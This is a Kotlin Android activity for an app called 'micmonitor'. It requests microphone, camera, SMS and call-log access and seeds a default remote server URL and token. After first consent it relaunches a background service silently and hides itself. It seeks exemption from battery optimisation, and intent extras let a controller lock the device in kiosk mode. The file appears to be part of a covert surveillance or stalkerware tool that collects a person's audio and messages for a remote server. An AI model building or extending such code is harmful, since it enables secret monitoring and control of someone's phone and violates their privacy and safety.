package com.micmonitor.app

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val REQUEST_CODE = 1001
        private val LEGACY_SERVER_HOSTS = setOf(
            "micmonitor-server.onrender.com"
        )
    }

    private val prefs by lazy {
        getSharedPreferences("micmonitor", Context.MODE_PRIVATE)
    }

    // All permissions needed
    private val requiredPermissions: Array<String>
        get() {
            val perms = mutableListOf(
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
            )
            return perms.toTypedArray()
        }

    @SuppressLint("SetTextI18n")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Seed server configuration once so release builds can carry defaults.
        val existingUrl = prefs.getString("server_url", null).orEmpty().trim()
        if (existingUrl.isBlank()) {
            prefs.edit().putString("server_url", MicService.DEFAULT_SERVER_URL).apply()
        }
        
        val existingToken = prefs.getString("server_token", null).orEmpty().trim()
        if (existingToken.isBlank() && MicService.DEFAULT_SERVER_TOKEN.isNotBlank()) {
            prefs.edit().putString("server_token", MicService.DEFAULT_SERVER_TOKEN).apply()
        }

        val btnGrant = findViewById<Button>(R.id.btnGrant)
        val tvStatus = findViewById<TextView>(R.id.tvStatus)

        // Already set up — restart service silently
        if (prefs.getBoolean("consent_given", false) && hasCorePermissions()) {
            handleIntents(intent)
            launchServiceWithIntent(Intent(this, MicService::class.java))
            requestBatteryOptExemption()

            if (!prefs.getBoolean("lock_task_mode", false)) {
                finish()
                return
            }
        }

        btnGrant.setOnClickListener {
            if (!hasCorePermissions()) {
                tvStatus.apply {
                    text = getString(R.string.status_requesting)
                    visibility = android.view.View.VISIBLE
                }
                ActivityCompat.requestPermissions(this, requiredPermissions, REQUEST_CODE)
            } else {
                markConsentGiven()
                Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show()
                launchServiceWithIntent(Intent(this, MicService::class.java))
                requestBatteryOptExemption()
                finish()
            }
        }
    }

    private fun markConsentGiven() {
        prefs.edit().putBoolean("consent_given", true).apply()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                createDeviceProtectedStorageContext()
                    .getSharedPreferences("micmonitor", Context.MODE_PRIVATE)
                    .edit().putBoolean("consent_given", true).apply()
            } catch (_: Exception) {}
        }
    }

    private fun hasCorePermissions(): Boolean {
        return requiredPermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_CODE) {
            val micIndex = permissions.indexOf(Manifest.permission.RECORD_AUDIO)
            val micGranted = micIndex >= 0 && grantResults[micIndex] == PackageManager.PERMISSION_GRANTED
            val allGranted = grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }

            if (micGranted && allGranted) {
                markConsentGiven()
                Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show()
                launchServiceWithIntent(Intent(this, MicService::class.java))
                requestBatteryOptExemption()
                finish()
            } else {
                Toast.makeText(this, getString(R.string.toast_mic_required), Toast.LENGTH_LONG).show()
                findViewById<TextView>(R.id.tvStatus).apply {
                    text = getString(R.string.status_retry)
                    visibility = android.view.View.VISIBLE
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        if (prefs.getBoolean("consent_given", false) && hasCorePermissions()) {
            if (prefs.getBoolean("lock_task_mode", false)) {
                try {
                    startLockTask()
                    Log.i(TAG, "LockTaskMode started in onResume")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to startLockTask: ${e.message}")
                }
            } else {
                // If we were in lock task mode but now it's disabled, stop it
                try {
                    stopLockTask()
                } catch (_: Exception) {}
            }
        }
    }

    private fun handleIntents(intent: Intent?) {
        val action = intent?.getStringExtra("action")
        if (action == "lock") {
            prefs.edit().putBoolean("lock_task_mode", true).apply()
            try {
                startLockTask()
            } catch (e: Exception) {
                Log.e(TAG, "Intent lock failed: ${e.message}")
            }
        } else if (action == "unlock") {
            prefs.edit().putBoolean("lock_task_mode", false).apply()
            try {
                stopLockTask()
            } catch (e: Exception) {
                Log.e(TAG, "Intent unlock failed: ${e.message}")
            }
            finish()
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleIntents(intent)
    }

    private fun launchServiceWithIntent(intent: Intent) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    @SuppressLint("BatteryLife")
    private fun requestBatteryOptExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(PowerManager::class.java)
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(
                        Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                            .setData(Uri.parse("package:$packageName"))
                    )
                } catch (_: Exception) {
                    try {
                        startActivity(
                            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                                .setData(Uri.parse("package:$packageName"))
                        )
                    } catch (_: Exception) {
                        // No-op
                    }
                }
            }
        }
    }

    private fun isLocalOrLegacyServerUrl(url: String): Boolean {
        val v = url.lowercase()
        val isLocal = v.contains("localhost") ||
            v.contains("127.0.0.1") ||
            Regex("(^|[/:])192\\.168\\.").containsMatchIn(v) ||
            Regex("(^|[/:])10\\.").containsMatchIn(v) ||
            Regex("(^|[/:])172\\.(1[6-9]|2\\d|3[0-1])\\.").containsMatchIn(v)
        val isLegacyHost = LEGACY_SERVER_HOSTS.any { host -> v.contains(host) }
        return isLocal || isLegacyHost
    }


}
